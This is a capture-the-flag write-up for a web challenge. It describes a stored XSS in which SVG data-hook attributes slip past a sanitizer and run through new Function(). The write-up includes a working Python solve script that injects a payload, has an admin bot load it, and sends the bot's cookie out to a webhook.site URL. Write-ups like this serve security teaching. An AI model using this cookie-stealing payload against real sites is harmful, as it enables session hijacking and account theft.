---
title: "VOIDSTATION Mission Control (Hal-9 Triage)"
ctf: "Hackastra 2026 CTF"
date: 2026-05-29
category: web
difficulty: medium
points: 253
flag_format: "FLAG{...}"
author: "CL4Y"
---

# VOIDSTATION Mission Control (Hal-9 Triage)

## Summary

A report portal "sanitizes" user HTML and serves it at `/view/<id>`. The sanitizer strips `data-*`/`on*` on HTML elements but **leaves `data-*` intact inside the SVG namespace**, while the viewer page's boot script runs `new Function(el.getAttribute("data-hook"))()` for every `[data-hook]` element. With CSP allowing `'unsafe-eval'` and `connect-src *`, an `<svg data-hook="...">` becomes stored XSS. Triggering the Hal-9 admin bot (`/triage`) to view the report on its internal origin leaks its session cookie, which holds the flag.

## Solution

### Step 1: Find the sink and the bypass

The viewer (`/view/<id>`) ships this boot script — a deliberate eval sink:

```js
document.querySelectorAll("[data-hook]").forEach(el =>
  new Function(el.getAttribute("data-hook"))());   // runs any data-hook as JS
```

The response CSP cooperates:

```
script-src 'nonce-…' 'unsafe-eval';   ← new Function() is allowed
connect-src *;                         ← fetch() exfil to any host allowed
img-src 'self' data:;                  ← rules out <img> exfil, so use fetch()
```

The sanitizer strips `data-*`/`on*`/`javascript:` on HTML-namespace tags, but the challenge allows "basic SVG" — and inside the **SVG namespace** it leaves `data-hook` untouched:

```bash
# data-hook stripped on HTML element, kept on SVG element:
curl -s -X POST $T/report --data-urlencode 'html=<p data-hook=1>x</p><svg data-hook=2></svg>' ...
# -> <div id="report"><p>x</p><svg data-hook="2"></svg></div>
```

So `<svg data-hook="<JS>">` survives sanitization and is executed by the boot script.

### Step 2: Steal the bot's cookie

Submit the SVG payload, then `POST /triage {"url":"http://app.void:8080/view/<id>"}` (the worker only accepts its own internal origin). Hal-9 loads the page on its origin, our hook reads its non-HttpOnly cookie and `fetch()`es it out. One script, challenge → flag:

```python
#!/usr/bin/env python3
import re, time, urllib.parse, requests

TARGET, BOT_ORIGIN = "https://mission-control.hackastra.tech", "http://app.void:8080"

token = requests.post("https://webhook.site/token").json()["uuid"]
webhook = f"https://webhook.site/{token}"

# data-hook survives only in the SVG namespace; new Function() runs it (unsafe-eval),
# fetch() exfiltrates (connect-src *).
js = (f"fetch('{webhook}/?c='+encodeURIComponent(document.cookie)"
      f"+'&u='+encodeURIComponent(location.href))")
payload = f'<svg data-hook="{js}"></svg>'

view = requests.post(f"{TARGET}/report", data={"html": payload},
                     allow_redirects=False).headers["location"]      # /view/<id>
vid = view.rsplit("/", 1)[-1]
requests.post(f"{TARGET}/triage", json={"url": f"{BOT_ORIGIN}/view/{vid}"})

api = f"https://webhook.site/token/{token}/requests?sorting=newest"
for _ in range(13):
    for r in requests.get(api).json().get("data", []):
        m = re.search(r"[?&]c=([^&]+)", r.get("url", ""))
        if m and m.group(1):
            print("FLAG:", re.search(r"FLAG\{[^}]+\}", urllib.parse.unquote(m.group(1))).group(0))
            raise SystemExit
    time.sleep(3)
```

Output:

```
[+] stolen cookie: flag=FLAG{V01Dd_st4tion_0verride_c0des}
[+] FLAG: FLAG{V01Dd_st4tion_0verride_c0des}
```

## Flag

```
FLAG{V01Dd_st4tion_0verride_c0des}
```
